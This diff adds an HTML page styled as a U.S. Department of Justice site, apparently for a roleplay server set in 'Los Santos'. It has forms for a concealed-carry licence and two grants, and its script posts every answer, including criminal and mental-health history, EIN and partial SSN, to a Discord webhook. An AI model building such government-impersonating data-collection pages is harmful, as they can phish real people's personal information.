@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Department of Justice - Application Forms</title>
+    <style>
+        :root {
+            --primary: #002e6d;
+            --secondary: #bf0a30;
+            --background: #f5f5f5;
+            --header-bg: #002e6d;
+            --header-text: #ffffff;
+            --footer-bg: #333333;
+        }
+
+        body {
+            font-family: 'Times New Roman', Times, serif;
+            margin: 0;
+            padding: 0;
+            background: var(--background);
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: var(--header-bg);
+            color: var(--header-text);
+            padding: 20px 0;
+            border-bottom: 5px solid var(--secondary);
+        }
+
+        .header-content {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo img {
+            height: 60px;
+            margin-right: 15px;
+        }
+
+        .logo-text h1 {
+            font-size: 24px;
+            margin: 0;
+            font-weight: normal;
+        }
+
+        .logo-text h2 {
+            font-size: 18px;
+            margin: 5px 0 0;
+            font-weight: normal;
+        }
+
+        .main-content {
+            width: 90%;
+            max-width: 1200px;
+            margin: 30px auto;
+            background: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #ddd;
+        }
+
+        .tab {
+            padding: 12px 24px;
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-bottom: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .tab.active {
+            background: white;
+            color: var(--primary);
+            border-top: 3px solid var(--primary);
+            font-weight: bold;
+        }
+
+        .form-container {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .form-container.active {
+            display: block;
+            opacity: 1;
+        }
+
+        .form-title {
+            color: var(--primary);
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 10px;
+            margin-bottom: 25px;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .form-section h3 {
+            color: var(--primary);
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-family: inherit;
+            font-size: 16px;
+        }
+
+        input:focus, textarea:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 46, 109, 0.2);
+        }
+
+        .submit-btn {
+            background: var(--primary);
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            background: var(--secondary);
+        }
+
+        .footer {
+            background-color: var(--footer-bg);
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .disclaimer {
+            background-color: #f8f8f8;
+            border-left: 4px solid var(--secondary);
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .required-field::after {
+            content: " *";
+            color: var(--secondary);
+        }
+        
+        .radio-group {
+            margin-bottom: 10px;
+        }
+        
+        .radio-group label {
+            display: inline-block;
+            margin-right: 15px;
+            font-weight: normal;
+        }
+        
+        .radio-option {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+        
+        .radio-option input {
+            width: auto;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <div class="logo-text">
+                    <h1>U.S. DEPARTMENT OF JUSTICE</h1>
+                    <h2>Office of Justice Programs</h2>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('ccw', event)">CCW License Application</button>
+            <button class="tab" onclick="showTab('business', event)">Business Grant Application</button>
+            <button class="tab" onclick="showTab('agency', event)">Agency Grant Application</button>
+        </div>
+
+        <div class="disclaimer">
+            <strong>OFFICIAL USE ONLY:</strong> This form is for official government business. False statements may be punishable under federal law (18 U.S.C. § 1001).
+        </div>
+
+        <!-- CCW Form -->
+        <div id="ccw" class="form-container active">
+            <h2 class="form-title">CONCEALED CARRY WEAPON LICENSE APPLICATION</h2>
+            <h3 class="form-subtitle">Formularz BOF 4012</h3>
+            
+            <div class="form-section">
+                <h3>SECTION I: PERSONAL INFORMATION</h3>
+                <div class="form-group">
+                    <label for="ccw-name" class="required-field">Full Name</label>
+                    <input type="text" id="ccw-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-birth" class="required-field">Date of Birth</label>
+                    <input type="date" id="ccw-birth" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-birthplace" class="required-field">Place of Birth (City, State, Country)</label>
+                    <input type="text" id="ccw-birthplace" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-address" class="required-field">Residential Address</label>
+                    <input type="text" id="ccw-address" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-city" class="required-field">City</label>
+                    <input type="text" id="ccw-city" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-state" class="required-field">State</label>
+                    <select id="ccw-state" required>
+                        <option value="">Select State</option>
+<option value="AK">Alaska</option>
+<option value="AZ">Arizona</option>
+<option value="AR">Arkansas</option>
+<option value="CA">California</option>
+<option value="CO">Colorado</option>
+<option value="CT">Connecticut</option>
+<option value="DE">Delaware</option>
+<option value="FL">Florida</option>
+<option value="GA">Georgia</option>
+<option value="HI">Hawaii</option>
+<option value="ID">Idaho</option>
+<option value="IL">Illinois</option>
+<option value="IN">Indiana</option>
+<option value="IA">Iowa</option>
+<option value="KS">Kansas</option>
+<option value="KY">Kentucky</option>
+<option value="LA">Louisiana</option>
+<option value="ME">Maine</option>
+<option value="MD">Maryland</option>
+<option value="MA">Massachusetts</option>
+<option value="MI">Michigan</option>
+<option value="MN">Minnesota</option>
+<option value="MS">Mississippi</option>
+<option value="MO">Missouri</option>
+<option value="MT">Montana</option>
+<option value="NE">Nebraska</option>
+<option value="NV">Nevada</option>
+<option value="NH">New Hampshire</option>
+<option value="NJ">New Jersey</option>
+<option value="NM">New Mexico</option>
+<option value="NY">New York</option>
+<option value="NC">North Carolina</option>
+<option value="ND">North Dakota</option>
+<option value="OH">Ohio</option>
+<option value="OK">Oklahoma</option>
+<option value="OR">Oregon</option>
+<option value="PA">Pennsylvania</option>
+<option value="RI">Rhode Island</option>
+<option value="SC">South Carolina</option>
+<option value="SD">South Dakota</option>
+<option value="TN">Tennessee</option>
+<option value="TX">Texas</option>
+<option value="UT">Utah</option>
+<option value="VT">Vermont</option>
+<option value="VA">Virginia</option>
+<option value="WA">Washington</option>
+<option value="WV">West Virginia</option>
+<option value="WI">Wisconsin</option>
+<option value="WY">Wyoming</option>
+
+                        
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-phone" class="required-field">Phone Number</label>
+                    <input type="tel" id="ccw-phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-occupation" class="required-field">Occupation/Position</label>
+                    <input type="text" id="ccw-occupation" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-employer" class="required-field">Employer Name and Address</label>
+                    <input type="text" id="ccw-employer" required>
+                </div>
+            </div>
+            
+            <div class="form-section">
+                <h3>SECTION II: BACKGROUND INFORMATION</h3>
+                <div class="form-group">
+                    <label>Have you ever been convicted of a felony? If yes, please explain:</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-criminal-yes" name="ccw-criminal" value="yes">
+                        <label for="ccw-criminal-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-criminal-no" name="ccw-criminal" value="no" checked>
+                        <label for="ccw-criminal-no">No</label>
+                    </div>
+                    <textarea id="ccw-criminal-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Have you ever been addicted to alcohol or controlled substances? If yes, please explain:</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-addiction-yes" name="ccw-addiction" value="yes">
+                        <label for="ccw-addiction-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-addiction-no" name="ccw-addiction" value="no" checked>
+                        <label for="ccw-addiction-no">No</label>
+                    </div>
+                    <textarea id="ccw-addiction-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Are you currently subject to any restraining orders? If yes, please explain:</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-restraining-yes" name="ccw-restraining" value="yes">
+                        <label for="ccw-restraining-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-restraining-no" name="ccw-restraining" value="no" checked>
+                        <label for="ccw-restraining-no">No</label>
+                    </div>
+                    <textarea id="ccw-restraining-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Have you ever been hospitalized for mental illness? If yes, please explain:</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-mental-yes" name="ccw-mental" value="yes">
+                        <label for="ccw-mental-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-mental-no" name="ccw-mental" value="no" checked>
+                        <label for="ccw-mental-no">No</label>
+                    </div>
+                    <textarea id="ccw-mental-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Has a weapon license ever been denied or revoked? If yes, please explain:</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-denied-yes" name="ccw-denied" value="yes">
+                        <label for="ccw-denied-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-denied-no" name="ccw-denied" value="no" checked>
+                        <label for="ccw-denied-no">No</label>
+                    </div>
+                    <textarea id="ccw-denied-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Are you currently under investigation, probation or parole? If yes, please explain:</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-probation-yes" name="ccw-probation" value="yes">
+                        <label for="ccw-probation-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-probation-no" name="ccw-probation" value="no" checked>
+                        <label for="ccw-probation-no">No</label>
+                    </div>
+                    <textarea id="ccw-probation-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Is there any other information that might affect this application?</label>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-other-yes" name="ccw-other" value="yes">
+                        <label for="ccw-other-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="ccw-other-no" name="ccw-other" value="no" checked>
+                        <label for="ccw-other-no">No</label>
+                    </div>
+                    <textarea id="ccw-other-details" rows="3" placeholder="If yes, please provide details"></textarea>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION III: REASON FOR APPLICATION</h3>
+                <div class="form-group">
+                    <label for="ccw-reason" class="required-field">Why are you applying for a concealed carry weapon license?</label>
+                    <textarea id="ccw-reason" rows="4" required></textarea>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION IV: CERTIFICATION</h3>
+                <p>I understand that submission of this application does not guarantee issuance of a CCW license and that all fees are non-refundable. I understand that if my application is approved and I receive a CCW license, it will be subject to restrictions and that misuse will result in automatic revocation and possible criminal charges. I am aware that any use of a firearm may result in criminal or civil liability.</p>
+                
+                <p>I hereby authorize the licensing authority to which this application is made to conduct a background investigation on me and to contact any person or agency who may add information to or aid in this investigation. I further authorize the persons, firms, agencies, and institutions listed in this application to disclose or confirm any information about me and any statements I have made in this application.</p>
+                
+                <p>Notwithstanding any other provision of law, pursuant to the Public Records Act (Section 7920.000 et seq. of the Government Code), I acknowledge that the information contained in this application may constitute a public record and may be subject to release upon request or court order.</p>
+                
+                <p>I certify under penalty of perjury under the laws of the State of California that the foregoing information is true and correct.</p>
+                
+                <div class="form-group">
+                    <label for="ccw-signature" class="required-field">Signature</label>
+                    <input type="text" id="ccw-signature" required>
+                </div>
+                <div class="form-group">
+                    <label for="ccw-date" class="required-field">Date</label>
+                    <input type="date" id="ccw-date" required>
+                </div>
+            </div>
+
+            <button class="submit-btn" onclick="submitCCW()">SUBMIT APPLICATION</button>
+        </div>
+
+        <!-- Business Form -->
+        <div id="business" class="form-container">
+            <h2 class="form-title">SMALL BUSINESS GRANT APPLICATION</h2>
+            
+            <div class="form-section">
+                <h3>SECTION I: BUSINESS INFORMATION</h3>
+                <div class="form-group">
+                    <label for="biz-name" class="required-field">Business Name</label>
+                    <input type="text" id="biz-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-legal" class="required-field">Legal Structure</label>
+                    <select id="biz-legal" required>
+                        <option value="">Select Legal Structure</option>
+                        <option value="LLC">Limited Liability Company (LLC)</option>
+                        <option value="Corporation">Corporation</option>
+                        <option value="Sole Proprietorship">Sole Proprietorship</option>
+                        <option value="Partnership">Partnership</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="biz-address" class="required-field">Business Address</label>
+                    <input type="text" id="biz-address" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-city" class="required-field">City</label>
+                    <input type="text" id="biz-city" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-phone" class="required-field">Phone Number</label>
+                    <input type="tel" id="biz-phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-founded" class="required-field">Date Business Established</label>
+                    <input type="date" id="biz-founded" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-industry" class="required-field">Primary Industry</label>
+                    <input type="text" id="biz-industry" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-tax-id" class="required-field">Federal Tax ID (EIN)</label>
+                    <input type="text" id="biz-tax-id" required>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION II: OWNER INFORMATION</h3>
+                <div class="form-group">
+                    <label for="biz-owner" class="required-field">Primary Owner Name</label>
+                    <input type="text" id="biz-owner" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-owner-position" class="required-field">Position</label>
+                    <input type="text" id="biz-owner-position" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-owner-phone" class="required-field">Phone</label>
+                    <input type="tel" id="biz-owner-phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-owner-percentage" class="required-field">Ownership Percentage</label>
+                    <input type="number" id="biz-owner-percentage" min="0" max="100" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-owner-ssn" class="required-field">SSN (Last 4 Digits)</label>
+                    <input type="text" id="biz-owner-ssn" required pattern="\d{4}" maxlength="4">
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION III: GRANT REQUEST</h3>
+                <div class="form-group">
+                    <label for="biz-amount" class="required-field">Requested Amount ($)</label>
+                    <input type="number" id="biz-amount" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-purpose" class="required-field">Purpose of Grant</label>
+                    <textarea id="biz-purpose" rows="4" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="biz-plan" class="required-field">Description of Planned Use</label>
+                    <textarea id="biz-plan" rows="4" required></textarea>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION IV: BUSINESS OPERATIONS</h3>
+                <div class="form-group">
+                    <label for="biz-fulltime" class="required-field">Number of Full-Time Employees</label>
+                    <input type="number" id="biz-fulltime" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-parttime" class="required-field">Number of Part-Time Employees</label>
+                    <input type="number" id="biz-parttime" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-revenue" class="required-field">Average Monthly Revenue (last 3 months) ($)</label>
+                    <input type="number" id="biz-revenue" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-expenses" class="required-field">Average Monthly Expenses ($)</label>
+                    <input type="number" id="biz-expenses" required>
+                </div>
+                <div class="form-group">
+                    <label>Is the business currently operational?</label>
+                    <div class="radio-option">
+                        <input type="radio" id="biz-operational-yes" name="biz-operational" value="yes" checked>
+                        <label for="biz-operational-yes">Yes</label>
+                    </div>
+                    <div class="radio-option">
+                        <input type="radio" id="biz-operational-no" name="biz-operational" value="no">
+                        <label for="biz-operational-no">No</label>
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION V: CERTIFICATION</h3>
+                <p>I certify that all information provided is true and complete to the best of my knowledge. I understand that submission of this application does not guarantee funding and that verification actions may be taken.</p>
+                
+                <div class="form-group">
+                    <label for="biz-signature" class="required-field">Signature</label>
+                    <input type="text" id="biz-signature" required>
+                </div>
+                <div class="form-group">
+                    <label for="biz-date" class="required-field">Date</label>
+                    <input type="date" id="biz-date" required>
+                </div>
+            </div>
+
+            <button class="submit-btn" onclick="submitBusiness()">SUBMIT APPLICATION</button>
+        </div>
+
+        <!-- Agency Form -->
+        <div id="agency" class="form-container">
+            <h2 class="form-title">LAW ENFORCEMENT AGENCY GRANT APPLICATION</h2>
+            
+            <div class="form-section">
+                <h3>SECTION I: AGENCY INFORMATION</h3>
+                <div class="form-group">
+                    <label for="agency-name" class="required-field">Agency Name</label>
+                    <input type="text" id="agency-name" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-address" class="required-field">Agency Address</label>
+                    <input type="text" id="agency-address" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-city" class="required-field">City</label>
+                    <input type="text" id="agency-city" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-phone" class="required-field">Phone Number</label>
+                    <input type="tel" id="agency-phone" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-type" class="required-field">Agency Type</label>
+                    <select id="agency-type" required>
+                        <option value="">Select Agency Type</option>
+                        <option value="Police">Police Department</option>
+                        <option value="Sheriff">Sheriff's Office</option>
+                        <option value="State">State Police</option>
+                        <option value="Federal">Federal Agency</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION II: APPLICANT INFORMATION</h3>
+                <div class="form-group">
+                    <label for="agency-applicant" class="required-field">Applicant Name</label>
+                    <input type="text" id="agency-applicant" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-position" class="required-field">Position</label>
+                    <input type="text" id="agency-position" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-applicant-phone" class="required-field">Phone</label>
+                    <input type="tel" id="agency-applicant-phone" required>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION III: GRANT REQUEST</h3>
+                <div class="form-group">
+                    <label for="agency-amount" class="required-field">Requested Amount ($)</label>
+                    <input type="number" id="agency-amount" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-purpose" class="required-field">Purpose of Grant</label>
+                    <textarea id="agency-purpose" rows="4" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="agency-plan" class="required-field">Description of Planned Use</label>
+                    <textarea id="agency-plan" rows="4" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="agency-employees" class="required-field">Number of Employees</label>
+                    <input type="number" id="agency-employees" required>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <h3>SECTION IV: CERTIFICATION</h3>
+                <p>I certify that all information provided is true and complete to the best of my knowledge. I understand that submission of this application does not guarantee funding and that verification actions may be taken.</p>
+                
+                <div class="form-group">
+                    <label for="agency-signature" class="required-field">Signature</label>
+                    <input type="text" id="agency-signature" required>
+                </div>
+                <div class="form-group">
+                    <label for="agency-date" class="required-field">Date</label>
+                    <input type="date" id="agency-date" required>
+                </div>
+            </div>
+
+            <button class="submit-btn" onclick="submitAgency()">SUBMIT APPLICATION</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>U.S. Department of Justice • 950 Pennsylvania Avenue, SA • Los Santos</p>
+        <p>This is an official website of the United States government</p>
+    </div>
+
+    <script>
+        const webhookURL = 'https://discord.com/api/webhooks/...'; // Replace with your actual Discord webhook URL
+
+        function showTab(tabName, event) {
+            document.querySelectorAll('.form-container').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+            
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        async function sendToDiscord(embed) {
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        embeds: [embed],
+                        username: 'DOJ Application Bot',
+                        avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Great_Seal_of_the_United_States%28obverse%29.svg/1200px-Great_Seal_of_the_United_States%28obverse%29.svg.png'
+                    })
+                });
+                alert('Application submitted successfully! Your reference number: DOJ-' + Math.floor(Math.random() * 1000000));
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Error submitting application. Please try again later.');
+            }
+        }
+
+        function submitCCW() {
+            if (!validateForm('ccw')) return;
+            
+            const criminalHistory = document.querySelector('input[name="ccw-criminal"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-criminal-details').value 
+                : 'None reported';
+                
+            const addictionHistory = document.querySelector('input[name="ccw-addiction"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-addiction-details').value 
+                : 'None reported';
+                
+            const restrainingOrders = document.querySelector('input[name="ccw-restraining"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-restraining-details').value 
+                : 'None reported';
+                
+            const mentalHealth = document.querySelector('input[name="ccw-mental"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-mental-details').value 
+                : 'None reported';
+                
+            const licenseDenied = document.querySelector('input[name="ccw-denied"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-denied-details').value 
+                : 'None reported';
+                
+            const probationStatus = document.querySelector('input[name="ccw-probation"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-probation-details').value 
+                : 'None reported';
+                
+            const otherInfo = document.querySelector('input[name="ccw-other"]:checked').value === 'yes' 
+                ? document.getElementById('ccw-other-details').value 
+                : 'None reported';
+            
+            const embed = {
+                title: '🔫 CCW License Application Submitted',
+                color: 0x002e6d,
+                description: 'A new Concealed Carry Weapon license application has been submitted.',
+                fields: [
+                    { name: '📌 Personal Information', value: `**Full Name:** ${document.getElementById('ccw-name').value}\n**Date of Birth:** ${document.getElementById('ccw-birth').value}\n**Place of Birth:** ${document.getElementById('ccw-birthplace').value}\n**Occupation:** ${document.getElementById('ccw-occupation').value}` },
+                    { name: '🏠 Address', value: `${document.getElementById('ccw-address').value}, ${document.getElementById('ccw-city').value}, ${document.getElementById('ccw-state').value}\n**Phone:** ${document.getElementById('ccw-phone').value}\n**Employer:** ${document.getElementById('ccw-employer').value}` },
+                    { name: '🛡️ Background Check', value: `**Criminal History:** ${criminalHistory}\n**Substance Abuse:** ${addictionHistory}\n**Restraining Orders:** ${restrainingOrders}\n**Mental Health:** ${mentalHealth}\n**License Denials:** ${licenseDenied}\n**Probation Status:** ${probationStatus}\n**Other Info:** ${otherInfo}` },
+                    { name: '📝 Reason for Application', value: document.getElementById('ccw-reason').value },
+                    { name: '🖋️ Certification', value: `**Signature:** ${document.getElementById('ccw-signature').value}\n**Date:** ${document.getElementById('ccw-date').value}` }
+                ],
+                footer: { text: 'Submitted: ' + new Date().toLocaleString() },
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToDiscord(embed);
+        }
+
+        function submitBusiness() {
+            if (!validateForm('business')) return;
+            
+            const embed = {
+                title: '🏢 Business Grant Application Submitted',
+                color: 0xbf0a30,
+                description: 'A new Small Business Grant application has been submitted.',
+                fields: [
+                    { name: '🏛️ Business Information', value: `**Business Name:** ${document.getElementById('biz-name').value}\n**Legal Structure:** ${document.getElementById('biz-legal').value}\n**Address:** ${document.getElementById('biz-address').value}, ${document.getElementById('biz-city').value}\n**Phone:** ${document.getElementById('biz-phone').value}\n**Founded:** ${document.getElementById('biz-founded').value}\n**Industry:** ${document.getElementById('biz-industry').value}\n**Tax ID:** ${document.getElementById('biz-tax-id').value}` },
+                    { name: '👤 Owner Information', value: `**Owner Name:** ${document.getElementById('biz-owner').value}\n**Position:** ${document.getElementById('biz-owner-position').value}\n**Phone:** ${document.getElementById('biz-owner-phone').value}\n**Ownership %:** ${document.getElementById('biz-owner-percentage').value}%\n**SSN (last 4):** ${document.getElementById('biz-owner-ssn').value}` },
+                    { name: '💰 Grant Request', value: `**Amount:** $${document.getElementById('biz-amount').value}\n**Purpose:** ${document.getElementById('biz-purpose').value}\n**Plan:** ${document.getElementById('biz-plan').value}` },
+                    { name: '📊 Business Operations', value: `**Full-Time Employees:** ${document.getElementById('biz-fulltime').value}\n**Part-Time Employees:** ${document.getElementById('biz-parttime').value}\n**Avg Monthly Revenue:** $${document.getElementById('biz-revenue').value}\n**Avg Monthly Expenses:** $${document.getElementById('biz-expenses').value}\n**Operational:** ${document.querySelector('input[name="biz-operational"]:checked').value === 'yes' ? 'Yes' : 'No'}` },
+                    { name: '🖋️ Certification', value: `**Signature:** ${document.getElementById('biz-signature').value}\n**Date:** ${document.getElementById('biz-date').value}` }
+                ],
+                footer: { text: 'Submitted: ' + new Date().toLocaleString() },
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToDiscord(embed);
+        }
+
+        function submitAgency() {
+            if (!validateForm('agency')) return;
+            
+            const embed = {
+                title: '🚔 Agency Grant Application Submitted',
+                color: 0x002e6d,
+                description: 'A new Law Enforcement Agency Grant application has been submitted.',
+                fields: [
+                    { name: '🏛️ Agency Information', value: `**Agency Name:** ${document.getElementById('agency-name').value}\n**Address:** ${document.getElementById('agency-address').value}, ${document.getElementById('agency-city').value}\n**Phone:** ${document.getElementById('agency-phone').value}\n**Type:** ${document.getElementById('agency-type').value}` },
+                    { name: '👤 Applicant Information', value: `**Applicant Name:** ${document.getElementById('agency-applicant').value}\n**Position:** ${document.getElementById('agency-position').value}\n**Phone:** ${document.getElementById('agency-applicant-phone').value}` },
+                    { name: '💰 Grant Request', value: `**Amount:** $${document.getElementById('agency-amount').value}\n**Purpose:** ${document.getElementById('agency-purpose').value}\n**Planned Use:** ${document.getElementById('agency-plan').value}\n**Number of Employees:** ${document.getElementById('agency-employees').value}` },
+                    { name: '🖋️ Certification', value: `**Signature:** ${document.getElementById('agency-signature').value}\n**Date:** ${document.getElementById('agency-date').value}` }
+                ],
+                footer: { text: 'Submitted: ' + new Date().toLocaleString() },
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToDiscord(embed);
+        }
+
+        function validateForm(formType) {
+            const form = document.getElementById(formType);
+            const requiredFields = form.querySelectorAll('[required]');
+            
+            for (const field of requiredFields) {
+                if (!field.value.trim()) {
+                    alert(`Please fill in all required fields`);
+                    return false;
+                }
+            }
+            return true;
+        }
+    </script>
+</body>
+</html>
